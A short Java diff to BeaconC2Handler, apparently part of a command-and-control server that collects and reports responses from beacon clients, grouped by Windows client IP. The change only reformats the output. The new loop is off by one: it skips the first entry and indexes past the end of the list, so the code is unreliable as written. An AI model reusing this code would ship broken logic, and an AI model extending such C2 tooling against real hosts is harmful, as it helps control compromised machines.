@@ -2,6 +2,9 @@ package Servers.Beacon;
 
 import java.io.IOException;
 import java.net.Socket;
+import java.util.ArrayList;
+import java.util.HashMap;
+
 import Servers.Duplexer;
 
 public class BeaconC2Handler implements Runnable{
@@ -92,7 +95,13 @@ public class BeaconC2Handler implements Runnable{
                     if(tokens[1].equals("ClientData")){
                         if(tokens[2].equals("Windows")){
                             if(tokens[3].equals("All")){
-                                responseToRequest = beaconServer.getMultipleClientResponses("Windows").toString();
+                                HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
+                                for (String IP : windowsClientResponseList.keySet()){
+                                    responseToRequest += IP + ": \n";
+                                    for (int i = 1; i < windowsClientResponseList.get(IP).size()+1; i++){
+                                        responseToRequest += i + ". " + windowsClientResponseList.get(IP).get(i);
+                                    }
+                                }
                             }else{
                                 responseToRequest = beaconServer.getSingleClientResponses(tokens[3]).toString();
                             }
